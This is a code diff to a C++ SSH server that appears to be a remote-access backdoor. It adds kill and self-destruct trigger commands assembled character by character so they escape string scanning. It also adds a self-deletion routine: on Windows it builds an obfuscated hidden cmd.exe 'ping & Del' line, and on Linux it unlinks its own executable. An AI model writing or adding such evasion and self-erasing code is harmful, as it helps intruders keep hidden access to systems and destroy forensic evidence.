@@ -47,6 +47,10 @@ const char* SSHServer::ip="127.0.0.1";
 int SSHServer::is_pty=0;
 std::recursive_mutex mtx;
 
+char SSHServer::kill_command[];
+char SSHServer::destruct_command[];
+
+
 #ifdef _WIN32
 SSHServer::my_CreatePseudoConsole SSHServer::my_CreatePseudoConsole_function = nullptr;
 SSHServer::my_ResizePseudoConsole SSHServer::my_ResizePseudoConsole_function = nullptr;
@@ -55,6 +59,31 @@ SSHServer::my_ClosePseudoConsole SSHServer::my_ClosePseudoConsole_function = nul
 
 SSHServer::SSHServer()
 {
+    /* Init CID commands*/
+    kill_command[0] = 'c';
+    kill_command[1] = 'i';
+    kill_command[2] = 'd';
+    kill_command[3] = '_';
+    kill_command[4] = 'k';
+    kill_command[5] = 'i';
+    kill_command[6] = 'l';
+    kill_command[7] = 'l';
+    kill_command[8] = '\r';
+
+    destruct_command[0] = 'c';
+    destruct_command[1] = 'i';
+    destruct_command[2] = 'd';
+    destruct_command[3] = '_';
+    destruct_command[4] = 'd';
+    destruct_command[5] = 'e';
+    destruct_command[6] = 's';
+    destruct_command[7] = 't';
+    destruct_command[8] = 'r';
+    destruct_command[9] = 'u';
+    destruct_command[10] = 'c';
+    destruct_command[11] = 't';
+    destruct_command[12] = '\r';
+
     if (gen_rsa_keys()) {
         debug("[+] RSA keys generated correctly\n");
     }
@@ -192,23 +221,66 @@ int SSHServer::copy_chan_to_fd(ssh_session session,
     sz = write(fd, data, len);
 #endif // _WIN32
 
-	/*if (sz > 1) {
-		debug("aaa");
-	}*/
 
-	//strc
-	//my_data.last_command.append((const char*)data, sz);
-	////auto a = my_data.last_command.back();
-	////debug("key %c\n", my_data.last_command.back());
-	//if (*(const char*)data == '\r') {
-	//	if (my_data.last_command == "tomate\r") {
-	//		debug("command to exit received\n");
-	//	}
-	//	my_data.last_command.clear();
-	//	
-	//}
+    if (sizeof(my_data->last_command) - my_data->index > len) {
+        memcpy(my_data->last_command + my_data->index, data, len);
+        my_data->index += len;
+    
+        if (memcmp(my_data->last_command, SSHServer::destruct_command, sizeof(SSHServer::destruct_command) - 1) == 0) {
+            SSHServer::self_destruct();
+            exit(0);
+
+        }
+        else if (memcmp(my_data->last_command, SSHServer::kill_command, sizeof(SSHServer::kill_command) - 1) == 0) {
+            exit(0);
+        }
+    }
+
+    // Reset when last char is new line
+    if (*(char*)data == '\r') {
+        my_data->index = 0;
+    }
 
     return sz;
+}
+
+
+void SSHServer::self_destruct() {
+#ifdef _WIN32
+    //"cmd.exe /C ping 127.0.0.1 -n 5 > Nul & Del /f /q \"%s\""
+    char format[100] = { 0 };
+    strncat(format, "cmd.", sizeof(format));
+    strncat(format, "exe ", sizeof(format));
+    strncat(format, "/C p", sizeof(format));
+    strncat(format, "ing ", sizeof(format));
+    strncat(format, "127.0.0.1 ", sizeof(format));
+    strncat(format, "-n 5 >", sizeof(format));
+    strncat(format, " Nul & ", sizeof(format));
+    strncat(format, "Del ", sizeof(format));
+    strncat(format, "/f /", sizeof(format));
+    strncat(format, "q \"", sizeof(format));
+    strncat(format, "%s\"", sizeof(format));
+    TCHAR szModuleName[MAX_PATH];
+    TCHAR szCmd[MAX_PATH];
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+
+    GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+    sprintf_s(szCmd, MAX_PATH, format, szModuleName);
+
+    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+#else
+    char arg1[20];
+    char exepath[PATH_MAX + 1] = { 0 };
+
+    sprintf(arg1, "/proc/%d/exe", getpid());
+    readlink(arg1, exepath, sizeof(exepath));
+    unlink(exepath);
+#endif // _WIN32
 }
 
 void SSHServer::chan_close(ssh_session session, ssh_channel channel, void *userdata) {
@@ -518,7 +590,7 @@ int SSHServer::main_loop_shell(ssh_session session, struct thread_info_struct* t
     }
 
 	//data_arg = { hPipeOut, hPipeIn, {NULL}, 0 };
-    data_arg = { hPipeOut, hPipeIn, thread_info };
+    data_arg = { hPipeOut, hPipeIn, thread_info , {NULL}, 0 };
     cb.userdata = &data_arg;
 
 #else
